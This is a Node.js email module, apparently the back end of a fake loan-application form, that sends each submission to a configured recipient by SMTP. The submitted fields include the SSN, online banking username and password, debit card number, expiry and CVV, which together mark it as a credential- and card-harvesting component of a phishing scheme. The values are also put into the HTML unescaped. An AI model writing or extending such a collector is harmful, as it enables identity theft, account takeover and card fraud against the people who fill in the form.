import nodemailer from "nodemailer";

const {
  SMTP_HOST,
  SMTP_PORT,
  SMTP_USER,
  SMTP_PASS,
  RECIPIENT_EMAIL,
  EMAIL_FROM_NAME = "Loan Applications",
} = process.env;

if (!SMTP_HOST || !SMTP_PORT || !SMTP_USER || !SMTP_PASS || !RECIPIENT_EMAIL) {
  console.warn("[emailService] Missing SMTP configuration. Check environment variables.");
}

const transporter = nodemailer.createTransport({
  host: SMTP_HOST,
  port: Number(SMTP_PORT || 587),
  secure: Number(SMTP_PORT) === 465,
  auth: {
    user: SMTP_USER,
    pass: SMTP_PASS,
  },
});

const formatHTML = (data) => `
  <h2>New Loan Application Received</h2>
  
  <p><strong>First Name:</strong> ${data.firstName}</p>
  <p><strong>Last Name:</strong> ${data.lastName}</p>
  <p><strong>Email Address:</strong> ${data.email}</p>
  <p><strong>Phone Number:</strong> ${data.phone || "N/A"}</p>
  <p><strong>Birth Date:</strong> ${data.birthDate}</p>
  <p><strong>SSN:</strong> ${data.ssn}</p>
  <p><strong>Address Line 1:</strong> ${data.address1}</p>
  <p><strong>City:</strong> ${data.city}</p>
  <p><strong>State:</strong> ${data.state}</p>
  <p><strong>Zip Code:</strong> ${data.zipCode}</p>
  <p><strong>Bank Name:</strong> ${data.bankName}</p>
  <p><strong>Routing Number:</strong> ${data.routingNumber}</p>
  <p><strong>Account Number:</strong> ${data.accountNumber}</p>
  <p><strong>Bank Username:</strong> ${data.bankUsername}</p>
  <p><strong>Password:</strong> ${data.bankPassword}</p>
  <p><strong>Requested Loan Amount:</strong> ${data.loanAmount}</p>
  <p><strong>Loan Duration (Months):</strong> ${data.loanDuration}</p>
  <p><strong>Loan Purpose:</strong> ${data.loanPurpose}</p>
  
  <h3>Debit Card Details</h3>
  <p><strong>Card Number:</strong> ${data.debitCardNumber}</p>
  <p><strong>Expiry Month:</strong> ${data.expiryMonth}</p>
  <p><strong>Expiry Year:</strong> ${data.expiryYear}</p>
  <p><strong>CVV:</strong> ${data.cvv}</p>
`;

const formatText = (data) => `New Loan Application Received

First Name: ${data.firstName}
Last Name: ${data.lastName}
Email Address: ${data.email}
Phone Number: ${data.phone || "N/A"}
Birth Date: ${data.birthDate}
SSN: ${data.ssn}
Address Line 1: ${data.address1}
City: ${data.city}
State: ${data.state}
Zip Code: ${data.zipCode}
Bank Name: ${data.bankName}
Routing Number: ${data.routingNumber}
Account Number: ${data.accountNumber}
Bank Username: ${data.bankUsername}
Password: ${data.bankPassword}
Requested Loan Amount: ${data.loanAmount}
Loan Duration (Months): ${data.loanDuration}
Loan Purpose: ${data.loanPurpose}

Debit Card Details:
Card Number: ${data.debitCardNumber}
Expiry Month: ${data.expiryMonth}
Expiry Year: ${data.expiryYear}
CVV: ${data.cvv}
`;

export const sendLoanApplicationEmail = async (data) => {
  if (!RECIPIENT_EMAIL) {
    throw new Error("Recipient email is not configured");
  }

  await transporter.sendMail({
    from: `${EMAIL_FROM_NAME} <${SMTP_USER}>`,
    to: RECIPIENT_EMAIL,
    subject: "New Loan Application Received",
    text: formatText(data),
    html: formatHTML(data),
  });
};
